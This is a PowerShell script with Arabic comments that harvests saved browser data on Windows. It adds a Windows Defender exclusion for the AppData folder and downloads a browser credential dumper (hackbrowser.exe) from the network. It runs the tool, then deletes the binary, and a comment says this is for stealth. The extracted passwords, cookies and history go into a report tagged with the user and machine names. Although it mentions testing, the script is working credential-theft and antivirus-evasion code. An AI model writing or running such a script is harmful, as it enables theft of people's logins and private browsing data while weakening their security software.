# ------------------------------
# 1. إضافة استثناء Windows Defender (اختياري - يمكنك التعليق عليه)
# ------------------------------
Add-MpPreference -ExclusionPath "$env:appdata"

# ------------------------------
# 2. إنشاء المجلد الذي سنعمل عليه
# ------------------------------
mkdir "$env:appdata\Microsoft\dump" -Force
Set-Location "$env:appdata\Microsoft\dump"

# ------------------------------
# 3. تحميل وتشغيل أداة استخراج بيانات المتصفح
# ------------------------------
Invoke-WebRequest 'https://github.com/Real0xdom/venom/raw/master/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json

# حذف ملف الأداة بعد التشغيل (للتخفي)
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force

# ------------------------------
# 4. قراءة البيانات المستخرجة (ملفات JSON)
# ------------------------------
Write-Host "`n========== بيانات المستعرضات المستخرجة ==========" -ForegroundColor Cyan

# الحصول على جميع ملفات JSON في المجلد الحالي
$jsonFiles = Get-ChildItem -Filter "*.json"

# إنشاء محتوى التقرير الذي سيُحفظ على سطح المكتب
$desktopPath = [Environment]::GetFolderPath("Desktop")
$reportPath = Join-Path $desktopPath "BrowserData_Report.txt"
$reportContent = @()

# إضافة رأس التقرير
$reportContent += "تقرير بيانات المتصفح - تم الاستخراج في $(Get-Date)"
$reportContent += "المستخدم: $env:USERNAME"
$reportContent += "الجهاز: $env:COMPUTERNAME"
$reportContent += "=" * 60

if ($jsonFiles.Count -eq 0) {
    Write-Host "لم يتم العثور على أي ملفات JSON (ربما لا توجد بيانات متصفح محفوظة)." -ForegroundColor Yellow
    $reportContent += "لم يتم العثور على أي بيانات."
} else {
    foreach ($file in $jsonFiles) {
        Write-Host "`n--- الملف: $($file.Name) ---" -ForegroundColor Green
        $reportContent += "`n--- الملف: $($file.Name) ---"
        
        try {
            $content = Get-Content $file.FullName -Raw -ErrorAction Stop
            # عرض المحتوى في CMD
            Write-Host $content -ForegroundColor White
            $reportContent += $content
            
            # محاولة تحليل JSON لتنسيق أفضل (اختياري)
            $jsonObj = $content | ConvertFrom-Json -ErrorAction SilentlyContinue
            if ($jsonObj) {
                Write-Host "(تم التحليل كـ JSON بنجاح)" -ForegroundColor Gray
                $reportContent += "(تم التحليل كـ JSON بنجاح)"
            }
        }
        catch {
            $errMsg = "خطأ في قراءة الملف: $_"
            Write-Host $errMsg -ForegroundColor Red
            $reportContent += $errMsg
        }
    }
}

# ------------------------------
# 5. حفظ التقرير على سطح المكتب
# ------------------------------
$reportContent | Out-File -FilePath $reportPath -Encoding UTF8
Write-Host "`n[✓] تم حفظ التقرير على سطح المكتب في: $reportPath" -ForegroundColor Magenta

# ------------------------------
# 6. (اختياري) تنظيف المجلد المؤقت - علّق عليه إذا أردت الاحتفاظ بالبيانات داخل %appdata%
# ------------------------------
# cd "$env:appdata"
# Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
# Remove-MpPreference -ExclusionPath "$env:appdata"

# بدلاً من الحذف، نعرض رسالة بأن البيانات لا تزال موجودة في مجلد dump
Write-Host "`n[!] البيانات الخام لا تزال موجودة في: $env:appdata\Microsoft\dump" -ForegroundColor Yellow
Write-Host "يمكنك حذفها يدوياً بعد الانتهاء من الاختبار." -ForegroundColor Yellow
